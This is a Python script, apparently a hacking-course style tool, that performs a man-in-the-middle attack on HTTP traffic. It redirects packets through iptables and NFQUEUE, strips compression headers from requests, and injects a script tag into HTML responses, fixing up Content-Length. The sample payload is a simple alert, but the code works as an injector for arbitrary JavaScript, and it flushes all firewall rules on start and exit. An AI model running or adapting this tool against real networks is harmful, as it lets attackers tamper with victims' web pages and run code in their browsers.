#!usr/bin/env python

#########################################################################
# Author : Dhrumil Mistry
#########################################################################


#########################################################################
# If you encounter Import error after installing netfilter use command 
# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
#########################################################################

from subprocess import call
import netfilterqueue
import scapy.all as scapy
from re import search, sub

############################### Functions ############################### 
def forward_packets():
    '''
    configures the mitm for incoming request packets
    into a queue.
    '''

    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
    # for local host
    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
    


def reset_config():
    '''
    resets the configurations changed while exectution of the program to 
    its original configuration.
    '''
    call('sudo iptables --flush', shell=True)


def set_load(packet, load):
    '''
    sets the packet raw layer load value to the passed load value
    '''
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    '''
    process received packet, everytime a packet is received and

    '''
    global inj_code
    scapy_pkt = scapy.IP(packet.get_payload())
    if scapy_pkt.haslayer(scapy.Raw):

        load = scapy_pkt[scapy.Raw].load
        tampered_load = b'unchanged load'
        new_payload = b'unchanged payload'

        if scapy_pkt[scapy.TCP].dport == 80:
            print('[*] Request Detected!')
            tampered_load = sub(b'Accept-Encoding:.*?\\r\\n',b'', load)
            

        elif scapy_pkt[scapy.TCP].sport == 80:
            print('[*] Response Detected!')
            load = load.decode('utf-8', 'ignore')
            load = load.replace('</BODY>', '</body>')
            if '</body>' in load:
                print('\n[+] Script/Code Injected!!\n')
                tampered_load = load.replace('</body>', inj_code+'</body>')
                tampered_load = tampered_load.encode('utf-8', 'ignore')
                print(tampered_load)

                content_len_search = search("(?:Content-Length:\s)(\d*)", load)
                if content_len_search and b'text/html' in load:
                    content_len = content_len_search.group(1)
                    new_content_len = int(content_len) + len(inj_code)

                    tampered_load = sub(b'(?:Content-Length:\s)(\d*)', bytes(new_content_len), tampered_load)
                print(tampered_load)


        if load != scapy_pkt[scapy.Raw].load: 
            if tampered_load == b'unchanged load':  
                tampered_load = scapy_pkt[scapy.Raw].load
            
            new_payload = set_load(scapy_pkt, tampered_load)
            packet.set_payload(bytes(new_payload))
            print(new_payload.show())

    packet.accept()
    

############################### Main ############################### 

inj_code = '<script>alert("Payload Added!!")</script>'

reset_config()

print('[*] configuring packet receiver...')

forward_packets()
print('[*] packet receiver configured successfully.\n')

print('[*] Creating Queue to start receiving packets.')
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except OSError as e:
    print('[-] Run script with root priviliges.')
    print(e)

except KeyboardInterrupt:
    print('\r[-] Keyboard Interrupt detected!')

except Exception:
    print('[-] An Exception occurred while creating queue.\n', Exception)

finally:
    print('[*] Restoring previous configurations.. please be patient...')
    reset_config()

    print('[-] Program stopped.')
